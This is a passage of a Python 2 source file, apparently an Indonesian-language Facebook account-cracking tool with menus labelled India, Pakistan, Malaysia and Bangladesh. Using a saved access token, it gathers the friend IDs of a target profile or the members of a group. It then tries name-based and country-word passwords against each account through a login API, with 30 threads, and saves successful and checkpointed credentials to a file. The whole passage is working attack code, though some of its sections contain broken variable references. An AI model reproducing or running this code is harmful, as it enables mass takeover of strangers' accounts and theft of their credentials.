		idt = raw_input("\033[1;97m»»Masukan ID\033[1;97m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mNama:\033[1;92m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Salah!"
			raw_input("\n\033[1;91m[\033[1;97mKembali\033[1;91m]")
			black()
		print"\033[1;97mMencari ID\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;91mPilih Yang Benar"
		pilih_black()
	
	print "\033[1;97m»» Total ID : \033[1;92m"+str(len(id))
	jalan('\033[1;97m»» mStart Crack India...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m»»Crack \033[1;91m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;91m»»Stop CTRL+z')
	print 42*"\033[1;97m="
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Do_Dhe_Les
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[✓] ' + user + ' | ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;93m[+] ' + user + ' | ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92m[✓] ' + user + ' | ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;93m[+] ' + user + ' | ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[✓] ' + user + ' | ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;93m[+] ' + user + ' | ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '768'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92m[✓] ' + user + ' | ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;93m[+] ' + user + ' | ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + 'Thakur'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92m[✓] ' + user + ' | ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;93m[+] ' + user + ' | ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + 'khan'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92m[✓] ' + user + ' | ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;93m[+] ' + user + ' | ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = '768768'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92m[✓] ' + user + ' | ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;93m[+] ' + user + ' | ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)	
											                                       
																	
															
		except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m="
	print '\033[1;92m✓Selesai....'
	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	raw_input("\n\033[1;97m[\033[1;91mKembali\033[1;97m]")
	crack()
         
def mafia():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken Salah"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m»»1.Crack Publik ID."
        time.sleep(0.05)
	print "\033[1;91m»»0.Kembali"
	pilih_mafia()

def pilih_mafia():
	peak = raw_input("\n\033[1;97mPilih Tools>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mPilih yang benar"
		pilih_mafia()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m»»Masukan ID\033[1;97m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mNama:\033[1;92m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Salah!"
			raw_input("\n\033[1;91m[\033[1;97mKembali\033[1;91m]")
			mafia()
		print"\033[1;97mMencari ID\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;91mPilih Yang Benar"
		pilih_mafia()
	
	print "\033[1;97m»» Total ID : \033[1;92m"+str(len(id))
	jalan('\033[1;97m»» mStart Crack Pakistan...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m»»Crack \033[1;91m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;91m»»Stop CTRL+z')
	print 42*"\033[1;97m="
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Do_Dhe_Les
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '12'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[✓] ' + user + ' | ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;93m[+] ' + user + ' | ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92m[✓] ' + user + ' | ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;93m[+] ' + user + ' | ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[✓] ' + user + ' | ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;93m[+] ' + user + ' | ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92m[✓] ' + user + ' | ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;93m[+] ' + user + ' | ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '768'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92m[✓] ' + user + ' | ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;93m[+] ' + user + ' | ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'pakistan'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92m[✓] ' + user + ' | ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;93m[+] ' + user + ' | ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = '768768'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92m[✓] ' + user + ' | ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;93m[+] ' + user + ' | ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m="
	print '\033[1;92m✓Selesai....'
	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	raw_input("\n\033[1;97m[\033[1;91mKembali\033[1;97m]")
	crack()

def test():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken Salah"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m»»1.Crack Publik ID."
        time.sleep(0.05)
	print "\033[1;91m»»0.Kembali"
	pilih_test()

def pilih_test():
	peak = raw_input("\n\033[1;97mPilih Tools>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mPilih yang benar"
		pilih_test()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m»»Masukan ID\033[1;97m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mNama:\033[1;92m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Salah!"
			raw_input("\n\033[1;91m[\033[1;97mKembali\033[1;91m]")
			test()
		print"\033[1;97mMencari ID\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;91mPilih Yang Benar"
		pilih_test()
	
	print "\033[1;97m»» Total ID : \033[1;92m"+str(len(id))
	jalan('\033[1;97m»» mStart Crack Malaysia...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m»»Crack \033[1;91m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;91m»»Stop CTRL+z')
	print 42*"\033[1;97m="
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Do_Dhe_Les
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[✓] ' + user + ' | ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;93m[+] ' + user + ' | ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92m[✓] ' + user + ' | ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;93m[+] ' + user + ' | ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name']+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[✓] ' + user + ' | ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;93m[+] ' + user + ' | ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'malaysia'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92m[✓] ' + user + ' | ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;93m[+] ' + user + ' | ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'upinipin'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92m[✓] ' + user + ' | ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;93m[+] ' + user + ' | ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name']+'12'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92m[✓] ' + user + ' | ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;93m[+] ' + user + ' | ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['last_name'] + '123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92m[✓] ' + user + ' | ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;93m[+] ' + user + ' | ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m="
	print '\033[1;92m✓Selesai....'
	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	raw_input("\n\033[1;97m[\033[1;91mKembali\033[1;97m]")
	crack()
          
def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken Salah"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m»»1.Crack Publik ID."
        time.sleep(0.05)
	print "\033[1;91m»»0.Kembali"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97mPilih Tools>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mPilih yang benar"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		uty = raw_input("\033[1;97m»»Masukan ID\033[1;97m: \033[1;97m")
		try:
			kk = requests.get("https://graph.facebook.com/"+uty+"?access_token="+toket)
			hh = json.loads(kk.text)
			print"\033[1;97mNama:\033[1;92m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Salah!"
			raw_input("\n\033[1;91m[\033[1;97mKembali\033[1;91m]")
			super()
		print"\033[1;97mMencari ID\033[1;97m..."
		v = requests.get("https://graph.facebook.com/"+uty+"/friends?access_token="+toket)
		f = json.loads(v.text)
		for e in f['data']:
			id.append(e['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;91mPilih Yang Benar"
		pilih_super()
	
	print "\033[1;97m»» Total ID : \033[1;92m"+str(len(id))
	jalan('\033[1;97m»» mStart Crack Bangladesh...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m»»Crack \033[1;91m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;91m»»Stop CTRL+z')
	print 42*"\033[1;97m="
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Do_Dhe_Les
		try:
			g = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			l = json.loads(a.text)
			pass1 = l['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			e = json.load(data)
			if 'access_token' in e:
				print '\x1b[1;92m[✓] ' + user + ' | ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in e["error_msg"]:
					print '\x1b[1;93m[+] ' + user + ' | ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = l['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					e = json.load(data)
					if 'access_token' in e:
						print '\x1b[1;92m[✓] ' + user + ' | ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in e["error_msg"]:
							print '\x1b[1;93m[+] ' + user + ' | ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = l['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							e = json.load(data)
							if 'access_token' in e:
								print '\x1b[1;92m[✓] ' + user + ' | ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in e["error_msg"]:
									print '\x1b[1;93m[+] ' + user + ' | ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = l['first_name'] + '12'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									e = json.load(data)
									if 'access_token' in e:
										print '\x1b[1;92m[✓] ' + user + ' | ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in e["error_msg"]:
											print '\x1b[1;93m[+] ' + user + ' | ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = l['first_name'] + '768'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											e = json.load(data)
											if 'access_token' in e:
												print '\x1b[1;92m[✓] ' + user + ' | ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in e["error_msg"]:
													print '\x1b[1;93m[+] ' + user + ' | ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'bangladesh'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													e = json.load(data)
													if 'access_token' in e:
														print '\x1b[1;92m[✓] ' + user + ' | ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in e["error_msg"]:
															print '\x1b[1;93m[+] ' + user + ' | ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = '768768'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															e = json.load(data)
															if 'access_token' in e:
																print '\x1b[1;92m[✓] ' + user + ' | ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in e["error_msg"]:
																	print '\x1b[1;93m[+] ' + user + ' | ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m="
	print '\033[1;92m✓Selesai....'
	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	raw_input("\n\033[1;97m[\033[1;91mKembali\033[1;97m]")
	crack()

def clone_dari_member_group():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91mToken Salah"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;97m="
	id=raw_input('\033[1;97m»» Crack  ID group :\033[1;97m ')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;97m[\033[1;92m✓\033[1;97m] Nama group :\033[1;92m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] Group Tidak ada"
		raw_input("\n\033[1;91m»»0.Kembali")
		crack()
	jalan('\033[1;97m»» Mengambil email ...')
	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
	kimak = json.loads(teman.text)
	jalan('\033[1;97m»» Start ...')
	print('\x1b[1;91m[!] mStop CTRL+z')
	print 42*"\033[1;97m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
